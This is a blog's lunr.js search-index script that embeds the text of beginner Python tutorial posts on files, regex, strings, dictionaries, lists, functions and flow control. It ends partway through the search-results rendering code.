Process: There are three steps to reading or writing files in Python :  Call the open() function to return a File object.  Call the read() or write() method on the File object.  Close the file by calling the close() method on the File object. ####Opening Files with the open() FunctionTo open a file with the open() function, you pass it a string path indicating the file you want to open; it can be either an absolute or realtive path. The open() function returns a File object. This command will open the file in ‘reading plaintext’ mode, or read mode for short. when a file is opened in read mode, Python lets you only read data from the file; you can’t write or modify it in any way. Read mode is the default mode for files you open un Python. The call to open() returns a File object. Now whenever you want to read from or write to the file, you can do so by calling methods on the File object. Reading the Contents of Files: Now that you have a File object, you can start reading from it. If you want to read the entire contents of a file as a string value, use the File object’s read() method. Alternatively, you can use the readlines() method to get a list of string values from the file, one string for each line of the text which ends with a newline character (\n), except for the last line of the file. Writing to Files: Python allows you to write contents to a file in a way similar to how the print() function “writes” strings to the screen. You can’t write to a file you’ve opened in read mode, though. Instead, you need to open it in “write plaintext” mode or “append plaintext” mode, or write mode and append mode for short. Write mode will overwrite a variable’s value with a new value. PAss ‘w’ as the second argument to open() to open the file in write mode. Append mode, on the other hand, will append text to the end of the existing file. You can think of this as appending to a list in a variable, rather than overwriting the variable altogether. Pass ‘a’ as the second argument to open() to open the file in append mode. If the filename passed to open() does not exist, both write and append mode will create a new, blank file. After reading or writing a file, call the close() method before opening the file again. Saving Variables with the shelve Module: You can save variables in your Python programs to binary shelf files using the shelve module. This way, your program can restore data to variables from the hard drive. The shelve modulewill let you add Save and Open features to your program. For example, if you ran a program and entered some configuration settings, you could save those settings to a shelf file and then have the program load them the next time it is run. Here’s an example : &gt;&gt;&gt; import shelve&gt;&gt;&gt; shelfFile = shelve. open(‘mydata’)&gt;&gt;&gt; cats = [‘Zophie’,’Pooka’,’Simon’]&gt;&gt;&gt; shelfFile[‘cats’] = cats&gt;&gt;&gt; shelfFile. close() To read and write data using the shelve module, you first import shelve. Call shelve. open() and pass it a filename, and then store the returned shelf value in a variable. You can make changes to the shelf value as if it were a dictionary. When you’re done, call close() on the shelf value. Here, our shelf value is stored in shelfFile. We create a list cats and write shelfFile[‘cats’] = cats to store the list in shelfFile as a value associated with the key ‘cats’ (like in a dictionary). Then we call close() on a shelfFile. After running the previous code, you’ll see a new file in the current working directory. These binary files contain the data you stored in your shelf. Your programs can use the shelve module to later reopen and retrieve the data from these shelf files. Just like dictionaries, shelf values have keys() and values methods that will return list-like values of the keys and values in the shelf. Since these methods return list-like values instead of true list, you should pass them to the list() function to get them in list form. "
    }, {
    "id": 50,
    "url": "/Pattern-Matching/",
    "title": "Python - Pattern Matching",
    "body": "1996/11/02 - Regular expressions, called regexes for short, are descriptions for a pattern of text. Creating Regex Objects: All the regex functions in Python are in the re module. Passing a string value representing your regular expression to re. compile() returns a Regex pattern object (or simply, a Regex object) Matching Regex Objects: A regex object’s search() method searches the string it is apssed for any matches to the regex. The search() method will return None if the regex pattern is not found in the string. If the pattern is found, the search() method returns a Match object. Match objects have a group() method that will return the actual matched text from the searched string. Knowing that result of the search contains a Match object and not the null value None, we can call group() to return the match. Review of Regular Expression Matching: While there are several steps to using regular expressions in Python, each step is fairly simple.  Import the regex module with import re Create a Regex object with re. compile function. (Remeber to use raw string. ) Pass the string you want to search into the Regex object’s search method. This returns a Match object.  Call the Match object’s group() method to return a string of the actual matched text. More Pattern Matching with Regular Expressions:    Grouping with Parentheses : Adding parentheses will create groups in the regex : (\d\d\d)-(\d\d\d-\d\d\d\d), then you can use the group() match object method to grab the matching text from just one group. Passing 0 or nothing to the group() method will return the entire matched text. Using the groups() method will retreive all the groups at once as a tuple. you can use multiple-assignment trick to assign each value to a seperate variable. To include parentheses inside the regular expression, we can use the \( and \) in the raw string passed to re. compile()                 Matching Multiple Groups With the Pipe : The | charcter is called a pipe. You can use it anywhere you want to match one of many expressions. For example, the regular expression r’Russia     Amarica’ will match either ‘Russia’ or ‘America’.                          When both occur in the searched string, the first occurence of matching text will be returned as the Match object. You can also use the pipe to match one of several patterns as part of your regex (example : r’Bat(man     mobile     copter     bat)’ ).            Optional Matching with the Question Mark : Sometimes there is a pattern that you want to match only oprtionally. That is, the regex should find a match whether or not that bit of text is there. The ? charcter flags the group that precedes it as an optional part of the pattern. You can thing of the ? as saying :”if it’s there print it, if it’s not, don’t worry”.  Matching Zero or More with the Star : The * (called the star or asterisk) means “match zero or more” - the group that precedes the star can occur any number of times in the text. It can be completely abscent or repeated over and over again.  Matching One or More with the Plus : While * means “ match zero or more “, the + means “match one or more. ” Matching Specific Repetitions with Curly Brackets : If you have a group that you want to repeat a specific number of times, follow the group in your regex with a number in curly brackets, you can also specify a range by writing a minimum, a comma, and a maximum in between curly brackets, or even leave out the first or second number in the curly brackets to leave the minimum or maximum unbounded.  Greedy and Nongreedy Matching : Python’s regular expressions are greedy by default, which means that in ambiguous situtations they will match the longest string possible. The non-greedy version of the curly brackets, which matches the shortest string possible, has the closing curly bracket followed by a question mark. Note that the question mark can have two meanings in regular expressions: declaring a nongreedy match or flagging an optional group. These meanings are entirely unrelated.  The findall() Method : In addition to the search() method, Regex objects also have a findall() method. While search() will return a Match object of the first matched text in the searched string, the findall() method will return the strings of every match in the searched string. find() will not return a Match object but a list of strings - as long as there are no groups in the regular expressions. Each string in the list is a piece of the searched text that matched the regular expression. If there are groups in the regular expression, the findall() will return a list of tuples. Each tuple represent a found match, and its items are the matched strings for each group in the regex. Character Classes: Here’s a table which represents shorthands codes for common charachter classes. | Shorthand character class   | Represents                                              ||--------------------------------|------------------------------------------------------------------------------------------------------|| \d               | Any numeric digit from 0 to 9                                    || \D               | Any character that is not a numeric digit from 0 to 9                        || \w               | Any letter, numeric digit, or the underscore character. Think of this as matching 'word' characters. || \W               | Any character that is not a letter, numeric digit, or the underscore character.            || \s               | Any space, tab, or newline character. (Think of this as matching 'space' characters. )        || \S               | Any character that is not a space, tab, or newline.                          |Character classes are nice for shortening regular expressions. Making Your Own Character Classes: You can define your own character class using square brackets like for example r’[putin]’. You can also include ranges of letters or numbers by using a hyphen. For example : the character class [a-zA-Z0-9] will match all lowercase letters, uppercase letters, and numbers. Note that inside the square brackets, the normal regular expression symbols are not interpreted as such. This means you do not need to escape the . ,*,? or () characters with a preceding backslash. For example, the character class [0-5. ] will match digits 0 to 5 and a period. You do not need to write it as [0-5\. ]. By placing a caret character (^) just after the character class’s opening bracket, you can make a negative character class. A negative character class will match all the characters that are not in the character class. The Caret and Dollar Sign Characters: You can also use the caret symbol (^) at the start of a regex to indicate that a match must occur at the beginning of a searched text. Likewise, you can put dollar sign ($) at the end of the regex to indicate the string must end with this regex pattern. And you can use ^ and $ together to indicate that the entire string must match the regex - That is, it’s not enough for a match to be made on some subset of the string. The Wildcard Character: The . (or dot) character in a regular expression is called a wildcard and will match any character except for a newline. Matching Everything with Dot-Star: You can use the dot-star(. *) to stand in for that “anything. ”. Remember that the dot character means “any single character except the newline” and the star character means “zero or more of the preceding character”. The dot-star uses greedy mode: It will always try to match as much text as possible. To match any and all text in a nongreedy fashion, use the dot, star, and question mark (. *?). Matching Newlines with the Dot Character: The dot-star will match everything except a newline. By passing re. DOTALL as the second argument to re. compile(), you can make the dot character match all characters, including the newline character. Reveiw of Regex Symbols:  The ? matches zero on one of the preceding group.  The * matches zero or more of the preceding group.  The + matches one or more of the preceding group.  The {n} matches exactly n of the preceding group.  The {n,} matches n or more of the preceding group.  The {,m} matches 0 to m of the preceding group.  The {n,m} matches at least n and at most m of the preceding group.  {n,m}? or *? or +? performs a nongreedy match of the preceding group.  ^spam means the string must begin with spam.  spam$ means the string must end with spam.  The . matches any character, except newline characters.  \d, \w, and \s match a digit, word, or space character, respectively.  \D, \W, and \S match anything except a digit, word, or space character, respectively.  [abc] matches any character between the brackets (such as a, b, or c).  [\^abc] matches any character that isn’t the brackets. Case-Insensitive Matching: Normally, regular expressions match text with the exact casing you specify. But sometimes you care only about matching the letters without worrying whether they’re uppercase or lowercase. To make your regex case-insensitive, you can pass re. IGNORECASE or re. I as a second argument to re. compile(). "
    }, {
    "id": 51,
    "url": "/Manipulating-Strings/",
    "title": "Python - Manipulating Strings",
    "body": "1996/10/31 - Typing string values in Python code is fairly straightforward: They begin and end with a single quote or double quotes. The benifit of using the double quotes is that string can have a single quote character in it. Escape Characters: An escape character lets you use characters that are otherwise impossible to put into a string. An escape character consists of a backslash () foloowed by the character you want to add to the string. | Escape character  | Prints as  ||---------------------|--------------|| \'         | Single quote || \          | Double Quote || \t         | tab     || \n         | Newline   || \\         | Backslash  |Raw Strings: You can place an r before the beginning quotation mark of a string to make it a raw string : a raw string completely ignores all escape characters and prints any backslash that appears in the string. Multiline Strings with Triple quotes: While you can use the \n escape character to put a newline into a tring, it is often easier to use multiline strings. A multiline string in Python begins and ends with either three single quotes or three double quotes. Any quotes, tabs, or newlines in between the triple quotes are considered part of the string. Python’s indentation rules for blocks do not apply to lines inside a multiline string. Multiline Comments: While the hash character (#) marks the beginning of a comment for the rest of the line, a multiline string is often used for comments that span multiple lines. Indexing and Slicing String: Strings use indexes and slices the same way lists do. You can think of the string “I’m putin” as a list and each character in the string as an item with a corresponding index. If you specify an index, you’ll get the character at that position in the string. If you specify a range from one index to another, the starting index id included and the ending index is not. The in and not in Operators with Strings: The in and not in operators can be used with strings just like with list values. An expression with two strngs joined using in or not in will evaluate to boolean True or False. Useful String Methods:  upper() and lower() : return a new string where all the letters are converted to uppercase or lowercase. Note that these methods do not change the string itself but return new string values.  isupper() and islower() : return a boolean if the string has at least one letter and all the letters are uppercase or lowercase, respectively.  isalpha() : returns True if the string consists only of letters and is not blank.  isalnum() : returns True if the string consists only of letters and numbers and is not blank (‘’).  isdecimal() : returns True if the string consists only of numeric characters and is not blank.  isspace() : returns True if the string consists only of spaces, tabs and newlines and is not blank.  istitle() : returns True if the string consists only of words that begin with an uppercase letter followed by only lowercase letters.  startswith() and endswith() : return True if the string value the are called on begins or ends (respectively) with the string passed to the method; otherwise, they return False.  join() and split() : The join() method is useful when you have a list of strings that need to be joined together into a single string value. The join() method is called on a string, gets passed a list of strings, and retruns a string. The returned string is the concatenation of each string in the passed in list. The split() method does the opposite : It’s called on a string value and returns a list of strings.  rjust() and ljust() : return a padded versioon of the string they are called on, with spaces inserted to justify the text. The first argument to bith methods is an integer length for the justified string.  center() : return a centered text that has the correct spacing than justifying it to the left or right.  strip(), rstrip() and lstrip() : strip() method will return a new string without any whitespace characters at the beginning or end. The lstrip() and rstrip() methods will remove whitespace characters from the left and right ends, respectively. Optionally, a strip argument will specify which characters on the ends should be stripped. Enough for today &lt;3"
    }, {
    "id": 52,
    "url": "/Dictionaries-and-structuring-data/",
    "title": "Python - Dictionaries and Structuring Data",
    "body": "1996/10/30 - The Dictionary Data Type: Like a list, a dictionary is a collection of many values. But unlike indexes for lists, indexes for dictionaries can use many different data types, not just integers. Indexes for dictionaries are called keys, and a key with its associated value is called a key-value pair. In code, a dictionary is typed with braces {}. Dictionaries can still use integer values as keys, just like lists use integers for indexes, but they do not have to start at 0 and can be any number. Dictionaries vs. Lists: Unlike lists, items in dictionaries are unordered. There’s no first item in a dictionary. Trying to access a key that does not exist in a dictionary will result in a keyError message, much like a list’s “out-of-range” IndexError. Though Dictionaries are not ordered, the fact that you can have arbitrary values for the keys allows you to organize you data in a powerful ways. The keys(), values(), and items() Methods: There are three dictionary methods that will return list-like values of the dictionary’keys, values, or both keys and values: keys(), values() and items(). The values returned by these methods are not true lists: They cannot be modified and do not have and append() method. But these data types (dict_keys, dict_values, and dict_items, respectively) can be used in for loops. Here’s an example : Using the keys(), values() and items() methods, a for loop can iterate over the keys, values, or key-value pairs in a dictionay, respectively. Notice that the values in the dict_items value returned by the items() method are tuples of the key and value. If you want a true list from one of these methods, pass its list-like return value to the list() function. If you want a true list from the one of these methods, pass its list-like return value to the list() function. You can also use the multiple assignement trick in a for loop to assign the key and a value to seperate variables. Here’s an example : Checking Whether a Key or Value Exists in a Dictionary: Recall from the previous post that the in and not in operators can check whether a value exists in a list. You can also use these operators to see whether a certain key or values exists in a dictionary. Like for example : We can use “‘president’ in whoami” without the keys() method and get the same answer. The get() Method: It’s tedious to check whether a key exists in a dictionary before accessing that key’s value. Fortunatly, dictionaries have a get() method that takes two arguments : the key of the value to retrieve and a fallback value to return if that key does not exist. The setdefault() Method: You’ll often have to set a value in a dictionary for a certain key only if that key does not already have a value. The setdefault() method offers a way to do this in one line of code. The first argument passed to the method is the key to check for, and the second argument is the value to set at that key if the key does not exist. If the key does exist, the setdefault() method returns the key’s value. Here’s an example : The setdefault() method is a nice shortcut to ensure that a key exists. Enough for today, see you tomorrow &lt;3 "
    }, {
    "id": 53,
    "url": "/lists/",
    "title": "Python - Lists",
    "body": "1996/10/29 - Introduction: I’ll assume that you’ve read last post, so one more topic you’ll need to understand before you can begin writing programs in earnest is the list data type and it’s cousin, the tuple. They can contain multiple values, which makes it easier to write programs that handle large amounts of data. And since lists themselves can contain other lists, you can use them to arrange data into hierarchical structures. The List Data Type: A list is a value that contains multiple values in an ordered sequence. A list value looks like this : [‘Russia’,’Moscow’,’Samara’]. Just as string values are typed with quote characters to mark where the string begins and ends, a list begins with an opening square bracket and ends with a closing square bracket, []. Values inside the list are also called items. Items are seperated with commas. Python lets you index the list values, it start with a 0. If you use an index that exceeds the number of values in your list value, it will an IndexError : List index out of range. Note that you can use negative indexes. The integer value -1 refers to the last index in a list, the value -2 refers to the second-of-last index in a list, and so on. Getting Sublists with Slices : Just as an index can get a single value from a list, a slice can get several values from a list, in the form of a new list. A slice is typed between square brackets, like an index, but it has two integers seperated by a colon. In a slice, the first integer is the index where the slice starts. The second integer is the index where the slice ends. A slice hoes up to, but will not include, the value at the second index. A slice evaluates to a new list value. Here’s an example of what I’ve been talking about. As a shortcut, you can leave out one or both of the indexes on either side of the colon in the slice. Leaving out the first index is the same as using 0 and leaving the second is the same as using the length of the list. Note that you can concatenate, replicate, change the values of a list. For removing values from lists, we can use the del statement. The “in” and “not in” Operators: You can determine whether a value is or isn’t in a list with in and not in operators. Like other operators, in and not in are used in expressions and connect two values: a value to look for in a list and the list where it may be found. These expressions will evaluate to a boolean value. Assignement: In lists, we can use th multiple assignement and the augmented assignement operators. The example below describes it all. Methods: A method is the same as a function, except it is “called on” a value. Each data type has its own set of methods. The list data type, for example, has several useful methods for finding, adding, removing, and otherwise manipulating values in a list. Finding a Value in a list with index() Method: List values have an index() method that can be passed a value, and if that value exists in the list, the index of the value is returned. If the value isn’t in the list, the Python produces a Value Error.  When there are duplictes of the value in the list, the index of it’s first appearence is returned. Adding Values to Lists with the append() and insert() Methods: The append() method call adds the argumennt to the end of the list. The insert() method can insert a value at any index in the list. The first argument to insert() is the index for the new value, and the second argument is the new value to be inserted. As I said before, methods belong to a single data type. The append() and insert() methods are list methods and can be called only on list values, not on other values such as strings or integers.  Removing Values from lists with remove(): The remove() method is passed the value to be removed from the list it is called on. If the value appears multiple times in the list, only the first instance of the value will be removed. The del statement is good to use when you know the index of the value you want to remove from the list. The remove() method is good when you know to value you want to remove from the list. Sorting the Values in a list with the sort() method: Lists of number values or lists of strings can be stored with the sort method. You can also pass True for the reverse keyword argument to have sort() sort the values in reverse order. There are three things you should note about the sort() method:  First, the sort() method sorts the list in place; don’t try to capture the return value.  You cannot sort lists that have both number values and string values in them, since Python doesn’t know how to compate values.  sort() uses “ASCIIbetical oreder” rather than actual alphabetical order for sorting strings. This means uppercase letters come before lowercase letters. List-like Types : Strings and Tuples: Lists aren’t the only data types that represent ordered sequences of values. For example, string and lists are actually similar, if you consider a string to be a “list” of single text characters. But lists and strings are different in an important way. A list value is a mutable data type: It can values added, removed or changed. However, a string is immutable: It cannot be changed. Trying to reassign a single character in a string results in a TypeError. The tuple data type is almost identical to the list data type, exepct in two ways :  Tuples are typed with parentheses.  Tuples are immutable, tuples cannot have their values modified, appended, or removed. If you have only one value in your tuple, you can indicate this by placing a trailing camma after the value inside the parentheses. Otherwise python will think you’ve just typed a value inside regular parentheses. You can easily converts list to tuple or a tuple to a list using list() and tuple() functions. References: Lists don’t get assigned the same way as other types. When you assign a list to a variable, you are actually assiging a list reference to the variable. A reference is a value that points to some bit of data, and a list reference is a value that points to a list. Although passing around references is often the handiest way to deal with lists, if the function modifies the list that is passed, you may not want these changes in the original list. For this Python provides a module named copy that provides both the copy() and deepcopy() functions. The first one can be used to make a duplicate copy of a mutable value like a list or dictionary, not just a copy of a reference. If the list you need to copy contains lists, then use the deepcopy() function which will copy the inner lists as well. Enough for today, see you tomorrow &lt;3 "
    }, {
    "id": 54,
    "url": "/functions/",
    "title": "Python - Functions",
    "body": "1996/10/28 - A function is like a mini-program within a programFunction Syntax : **def** functionName(SomeArguments)	&gt;Code 	&gt;Code	&gt;CodefunctionName(SomeArguments) &lt;- **Function Call**When the program execution reaches these calls, it will jump to the top line in the function and begin executing the code there. When it reaches the end of the function, the execution returns to the line that called the function and continues moving through the code as before. def statements with Parameters: A parameter is a variable that an argument is stored in when a function is called. One special thing to note about parameters is that the value stored in a parameter is forgotten when the function returns. We will discuss this later. Return Values and return Statments: When you call the len() function and pass it an argument such as ‘hello’, the function call evaluates to the integer value 5, which is the length of the string you passed it. In general, the value that a function call evaluates to is called the return value of the function. When creating a function using the def statement, you can specify the return value should be with a return statelent. A return statement consists of the following :  The return keyword.  The value or expression that the function should return. When an expression is used with a return statement, the return value is what this expression evaluates to. Let’s take an example : The None Value: In Python there is a value called None, which represents the abscence of a value. None is the only value of the NoneType data type. (Other programming languages might call this value null, nil or undefined. ) Just like the boolean True and False values, None must be typed with a capital N. This value-without-a-value can be helpful when you need to store somethin that won’t be confused for a real value in a variable. One place where None is used is as the return value of print(). The print() function displays text on the screen, but it doesn’t need to return anything like for example len(). But since all function calls need to evaluate to a return value, print =() returns None. Behind the scenes, Python adds return None to the end of any function definition with no return statement. Keyword Arguments and print(): Keyword arguments are often used for optional parameters. For example, the print() function has the optional parameters end and sep to specify what should be printed at the end of its arguments and between its arguments, respectively. Similarly, when you pass multiple string values to print(), the function will automatically seperate them with a string space but you could replace the default seperating string by passing the sep keyword argument.  Local and Global Scope:  Parameters and variables that are assigned in a called are said to exist in that function’s local scope.  Variables that are assigned outside all functions are said to exist in the global scope. A variable that exists in a local scope is called a local variable, while a variable that exists in the global scope is called global variable. A variable must be one or the other; it cannot be both local and global. A local scope is created whenever a function is called. When the function returns, the local scope is destroyed, and these variables are forgotten. Scope matter for several reasons:  Code in the global scope cannot use any local scope variables.  However, a locale scope can access global variables.  Code in a function’s local scope cannot use variables in any other local scope.  You can use the same name for different variables if they are in different scopes. The Global Statement: If you need to modify a global variable from within a function, use the global statement. It tells Python that this variable in this function refers to the global variable, so don’t create a local variable with this name. Here’s an example : Excecption Handling: Errors can be handled with try and except statements. The code could potentially have an error is put intry clause. The program execution moves to the start of a following except clause if an error happens. Here’s an example: 	 When code in a try clause causes an error, the program execution immeditly moves to the code in the except clause. After running that code, the execution continues as normal. Note that once the execution jumps to the code in the except clause, it does not return to the try clause. Instead it just continues moving down as normal. Enough for today, stay tuned for the practice project. &lt;3pu71N 4lW4Y2 pu7 1n. "
    }, {
    "id": 55,
    "url": "/python-flow_control/",
    "title": "Python - Flow Control",
    "body": "1996/10/27 - Prerequisite :: Last post. Boolean Values :: The Boolean data type has only two values : True and False. They also start with a capital T or F, with the rest of the word in lowercase. Comparison Operators: Comparison operators compare two values and evaluate down to a sing boolean value. | Operator  | Meaning         ||-------------|--------------------------|| ==     | Equal to         || !=     | Not equal to       || &lt;      | Less than        || &gt;      | Greater than       || &lt;=     | Less than or equal to  || &gt;=     | Greater than or equal to | Note that an integer or floating-point value will always be unequal to a string value. Python considers strings as text.  The = operator is for assignment only, not to confuse with the == (equal to ) operator. Boolean Operators: The threee boolean operators (and, or, and not) are used to compare Boolean values. Like comparison operators, they evaluate these expressions down to a boolean value. The “and” operator | Expression       | Evaluates to ||------------------------|--------------|| True and True     | True     || True and False     | False    || False and True     | False    || False and False    | False    |The “or” operator | Expression       | Evaluates to ||------------------------|--------------|| True or True      | True     || True or False     | True     || False or True     | True     || False or False     | False    |The not Operator: Unlike “and” and “or”, the not operator operates on only one boolean value (or expression). The not operator simply evaluates to the opposite boolean value. The Boolean operators have an order of operations just like the math operators do. After any math and comparison operators evaluate, Python evaluates the not operators first, then the and operators, and then the or operators. Elements of Flow Control: Flow control statements often start with a “condition”, and all are followed by a block of code called the “clause”.  Conditions :The boolean expressions that we’ve talked about can be considered all as conditions, which are the same thing as expressions; condition is just a more specific name in the context of flow control statements. Conditions always evaluate down to a boolean value, True or False.  Blocks of Code : Lines of Python code can be grouped together in blocks. You can tell when a block begins and ends from the indentation of the lines of code. The are three rules for blocks.      Blocks begin when the indentation increases.    Block’s can contain other blocks.    Blocks end when the indentation decreases to zero or to a containing block’s indentation.    Let’s take an example : By looking at the indentations, you’ll be able to identify the blocks of code. Flow Control Statements: Now let’s take a look at the most important piece of flow control: **the statements themselves**.  if statements : take a look at the previous example and you’ll understand the syntax of an if statement :     The if keyword .    A condition (that is, an expression that evaluates to Trus or False)   A colon   Starting on the next line, an indented block of code (called the if clause)    else statements :The else clause is executed only when the if statement’s condition is false. The else statement always consists of the following :     The else keyword.    A colon   Starting on the next line, an indented block of code (called the else clause)    elif statements : The elif statement is an “else if” statement that always follows an if or another elif statement. It provides another condition that is checked only if any of the previous conditions were False. Its synax is :     The elif keyword.    A condition.    A colon   Starting on the next line, an indented block of code (called theelif clause)    while Loop Statement :The code in a while clause will be executed as long as the while statement’s condition is True. In code, a while statement always consists of the following :     The while keyword   A condition   A colon   Starting on the next line, an indented block of code (called the while clause)      break Statements :There’s a shortcut to getting the program execution to break out of a while loop’s clause early. If the execution reaches a break statement, it immediatly exits the while loop’s clause. In code, a break statement simply contains the break keyword.     continue Statements : Like break statements, continue statements are used inside loops. When the program execution reaches a continue statement, the program execution immediately jumps back to the start of the loop and reevaluates the loop’s condition.   for loops and the rang() function:In code a for statement with a range() function looks something like for i in range(5): and always includes the following :     The for keyword   A variable name   The in keyword   A call to the range() method with up to three integers passed to it (Starting, Stopping, and Stepping Arguments)The first argument will be where the for loop’s variable starts, and the second argument will be up to, but not including, the number to stop at, and the third is the step; the amount that the variable is increased by after each iteration.    A colon   Starting on the next line, an indented block of code (called the for clause)Like the most programming languages for loops, the variable starts with a 0 and ends with 4 (n-1). Note that you can use break and continue statements inside for loops as well. The continue statement will continue to the next value of the for loop’s counter, as if the program execution had reached the end of the loop and returned to the start. In fact, you can use continue and break statements only inside while and for loops. If you try to use these statements elsewhere, Python will give you an error.    Notes :  Python does not have a Do While loop but we can make one.  There are some values in other data types that conditions will consider equivalent to True and False such as : 0, 0. 0 and ‘’ (The empty string).  A negative for loop example should be like :     &gt;&gt;&gt; for i in range(5,-1,-1): print (i)…543210    Importing Modules: All Python programs can call a basic set of functions called built-in functions, including the print(), input(), and len() functions you’ve see before. Python also comes with a set of modules called the standard library. Each module is a Python program that contains a related group of functions that can be embedded in your programs. For example the math module has mathematics related functions, the random random module has rundom number-related functions, and so on. Before you can use the functions in a module, you must import the module with an import statement. In code, an import statement consists of the following :  The import keyword The name of the module Optionally, more module names, as long as they are seperated by commasOnce you import a module, you can use all the cool functions of that module. Note : When we call imported functions, we need to use the name of the imported module as a prefix (e. g random. randint()). There’s an alternative form of the import statement which is from, composed by from keyword followed by the module name. Whith this form of import statement, calls to functions will not need the prefix. However, using the full name makes for more readable code, so it is better to use the normal form of the import statement. Ending a Program Early with sys. exit(): The last flow control concept is how to terminate the program. This always happens if the program execution reaches the bottom of the instructions. However, you can cause the program to terminate, or exit, by calling the sys. exit() function. Since this function is in the sys module, you have to import it before your program can use it. That’s all for today ! See you tomorrow &lt;3 "
    }, {
    "id": 56,
    "url": "/python_basics/",
    "title": "Python - Basics",
    "body": "1996/10/26 - Prerequisite: Installing python and launching the interactive shell. Math Operators from Highest to lowest precedence (Order of operations): | Operator   | Operation      | Example   | Evaluates to ||--------------|---------------------|-------------|--------------|| **      | Exponent      | 2**3    | 8      || %      | Modulo       | 22%8    | 6      || //      | Integer Division  | 22//8    | 2      || /      | Divison       | 22/8    | 2. 75     || *      | Multiplication   | 3*5     | 15      || -      | Substraction    | 5-2     | 3      || +      | Addition      | 2+2     | 4      | You can always test to see whether an instruction works by typing it into the interactive shell. Don’t worry about breaking the computer : The worst thing that could happen is that Python responds with an error message. Data Types: A data type is a category for values, and every value belongs to exactly one data type. The most common data types in Python are Integers, Floating-point numbers and Strings. For the strings type, Python knows where it begin and ends with the single quote (‘’) surrounding the text, If you ever see the error message SyntaxError : EOL while scanning string literal, you probably forget the final single quote character at the end of the string. String Concatenation and Replication: The meaning of an operator may change based on the data types of the values next to it. For example, + is the addition operator when it operates on two integers or floating-point values. However, when + is used on two string values, it joins the strings as the string concatenation operator. But you can’t concatenate variables with different types. Python will display the error Can’t Convert ‘int’ object to str implicitly **Remember the Zen of Python; Explicit is better than Implicit** . So your code will have to explicitly convert the integer to a string because python can’t do this automatically. (We will discuss data types conversion later). The * operator is used for multiplication when it operates on two integers or floating-point values. But when the * operator is used on one string value and one integer value, it becomes the string replication operator.  The * operator can be used with only two numeric values (for multiplication) or one string value and one integer value (for string replication). Otherwise, Python will just display an error message. Variables: Rules of naming variables in python :  It can be only one word.  It can use only letters, numbers, and the underscore ‘_’ charcter.  It can’t begin with a number.  Variable names are case-sensitive. Some programmers use camelcase for variable names (LookLikeThis) instead of underscores (Look_Like_This). Before we move on to next element, I want to mention that python does not support constants (Non-changing value assignments) like some other languages. Python files: The interactive shell is cool, but now we need to write our code and save it into . py files. I will not get deeper into the text editors and OSs but I’m using Vim and Ubuntu distro so the next line commands are entered into a linux terminal, so basically this is the script of our first python program where we print some text and ask for a name and an age and then use them for a reply. Enough for today, see you tomorrow ! &lt;3 Stay Home, Stay Safe! "
    }, {
    "id": 57,
    "url": "/python_intro/",
    "title": "Python Introduction",
    "body": "1996/10/25 - Prerequisite :: Installing python -As an introduction to python, We will talk about Easter Eggs (of python for sure). Hello World: The famous hello world program, python has a library that does that. Enter “import __hello__” and see the magic! Antigravity: Forget about the hello world library, enter this “import antigravity”! The Zen of Python: Now let’s talk seriously, first of all enter “import this” into the interactive shell. The output is “The Zen of Python”,a poem written by Tim Peters (American Software Developer and a huge contributer to this language) which explains the philosophy of this holy langauge. Here is a brief analysis of it :  Beautiful is better than ugly. - Instead of &amp;&amp; or || as logical operators, python uses and || or . **EASY PEASY** Explicit is better than implicit. “This aphorism is self-explanatory,” that would be a terrible explanation for any aphorism. Similarly, that’s what python do; verbose and explicit. We will talk about this later in upcoming posts.  Simple is better than complex. Complex is better than complicated. - Steve Jobs stated once that “simple can be harder than complex”. And that’s true. Requires a lot of hard work to get your thinking clean, to come up with a simple solution. But a simple solution is always better than a complex one. We need to apply those words in our code later.  Flat is better than nested. - Programmers love to organize things into categories, especially categories that contain subcategories which contain other sub-subcategories. These hierarchies often don’t add organization so much as they add bureaucracy.  Sparse is better than dense. - Writing some hard to read code may impress your friends but it’ll infuriate your coworkers who have to try to understand it. Keep it Sparce!   Readability counts. - It’s 2020 guys, we have enough memory to write out the full function name. **FUCK C LANGUAGE FUNCTION NAMES**   Special cases aren’t special enough to break the rules although practicality beats purity. - We will talk about this one later, it’s so special.  Errors should never pass silently, unless explicitly silenced. — Never let errors, which may occur, confuse the reader. This may easily be resolved by printing a string when an error occurs.  In the face of ambiguity, refuse the temptation to guess. –Computers have made humans superstitious: To exorcise the demons in our computers we perform the sacred ritual of turning them off and then on. Supposedly this will fix any mysterious problem. However, computers are not magic. If your code isn’t working, there is a reason and only careful, critical thinking will solve it. Refuse the temptation to blindly try solutions until something seems to work; often you have merely masked the problem rather than solved it.  There should be one—and preferably only one—obvious way to do it. - This is a broadside against the Perl programming language’s slogan, “There’s more than one way to do it!” It turns out that having three or four different ways to write code that does the same thing is a double-edged sword: you have flexibility in how you write code, but now you have to learn every possible way it could have been written in order to read it. This flexibility isn’t worth the 3x or 4x effort needed to learn a programming language.  Although that way may not be obvious at first unless you’re Dutch. — This is a reference to the creator of Python, Guido van Rossum. Seeing that Guido created the Python language, it would make sense that learning or recalling a rule in Python would be easier for him than it would be anybody else, on average.  Now is better than never. Although never is often better than right now. These two aphorisms tell us that code that hangs or gets caught in infinite loops is obviously worse than code that doesn’t. However, it’s almost certainly better to wait for your program to finish than to have it finish too early with incorrect results.  If the implementation is hard to explain, it’s a bad idea. If the implementation is easy to explain, it may be a good idea. - Python strives to make the programmer’s job easier rather than accommodate the computer so a program runs faster. And programs need to be understandable not just by the programmer who wrote it, but also by other programmers who maintain the code. These two aphorisms remind us that if “high-performance” code is so complicated as to be impossible for programmers to understand and debug, then it’s bad code. But alas, just because it’s easy to explain a program’s code to someone else doesn’t mean it isn’t bad code. Programming is hard.  Namespaces are one honking great idea — let’s do more of those! — Google defines a namespace as “a set of symbols that are used to organize objects of various kinds, so that these objects may be referred to by name. ” This still confuses me, so let’s see what we have here: Symbol sets, and various objects referred to by name. I suppose in general language, a word is defined by other words. Once learned, we need only the one word — or, namespace? — to make sense of something, making life simpler in the process. It’s enough for today, don’t forget to come back tomorrow ! Прощай &lt;3 Referrence : Official python PEP "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
